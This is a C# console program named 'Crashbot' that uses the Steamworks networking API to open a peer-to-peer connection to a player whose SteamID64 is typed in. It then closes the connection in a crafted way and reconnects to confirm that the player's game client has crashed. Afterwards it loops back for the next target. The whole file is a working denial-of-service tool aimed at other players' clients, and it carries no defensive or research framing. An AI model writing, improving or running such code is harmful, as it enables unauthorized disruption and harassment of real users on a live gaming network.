using Newtonsoft.Json;
using Steamworks;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using static SteamKit2.GC.Dota.Internal.CMsgDOTALeague;

namespace Crashbot
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Crashbot");
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            Console.WriteLine(Environment.CurrentDirectory);
            File.WriteAllText("steam_appid.txt", "387990");


            if (!Steamworks.SteamAPI.Init())
            {
                Debug.WriteLine("SteamAPI.Init() failed!");
                return;
            }
            else
            {
                Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
                Console.WriteLine("SteamID: " + Steamworks.SteamUser.GetSteamID());
            }

            Console.WriteLine("76561198299556567");

            start:

            Console.Write("Enter target SteamID64: ");
            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");

            var steamuser = new SteamKit2.SteamID(target);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());
            Console.WriteLine($"Targeting [{cSteamID.m_SteamID}]");

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);

            Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());

            SteamNetworkingConfigValue_t[] options = new SteamNetworkingConfigValue_t[1];
            options[0].m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32;
            options[0].m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected; // or another relevant option
            options[0].m_val.m_int32 = 100;

            HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 1, options);
            Console.WriteLine("Init connection...");

            Thread.Sleep(10);
            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out Steamworks.SteamNetConnectionInfo_t info);

            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);

                Thread.Sleep(10);
            }

            Console.WriteLine("Connected!");
            int maxMessages = 1;

            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    //Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
                    //Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn);
                    Console.WriteLine("Crashing client...");
                    Steamworks.SteamAPI.RunCallbacks();
                    Steamworks.SteamNetworkingSockets.RunCallbacks();
                    Thread.Sleep(50);
                    break;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }

            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);
            Console.WriteLine(info.m_eState);
            Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, "\0", false);
            Thread.Sleep(10);

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            // confirm crashed
            const int desiredTimeoutValue = 300;
            // Create an array of connection parameters (config values)
            SteamNetworkingConfigValue_t[] connectionParams = new SteamNetworkingConfigValue_t[1];

            // Set the timeout option
            connectionParams[0].m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial;
            connectionParams[0].m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = desiredTimeoutValue };

            // Start the connection attempt
            SteamNetworkingIdentity remoteIdentity2 = new();
            remoteIdentity2.SetSteamID(cSteamID);
            var conn2 = Steamworks.SteamNetworkingSockets.ConnectP2P(ref remoteIdentity2, 0, 1, connectionParams);

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            Thread.Sleep(10);
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn2, out info);

            SteamNetConnectionRealTimeStatus_t status = new();
            SteamNetConnectionRealTimeLaneStatus_t laneStatus = new();

            while (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connecting
                || info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_None)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                
                Steamworks.SteamNetworkingSockets.GetConnectionRealTimeStatus(conn2, ref status, 1, ref laneStatus);
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn2, out info);
                Console.WriteLine(JsonConvert.SerializeObject(info, Formatting.Indented));

                Console.WriteLine(JsonConvert.SerializeObject(status, Formatting.Indented));
                Console.WriteLine(JsonConvert.SerializeObject(laneStatus, Formatting.Indented));
                Thread.Sleep(500);
            }

            Console.WriteLine(JsonConvert.SerializeObject(info, Formatting.Indented));
            bool crashed = info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected;
            Console.WriteLine(crashed ? "Failed to Crash" : "Successfully Crashed!");

            Steamworks.SteamNetworkingSockets.CloseConnection(conn2, 0, "\0", false);

            goto start;
        }
    }
}
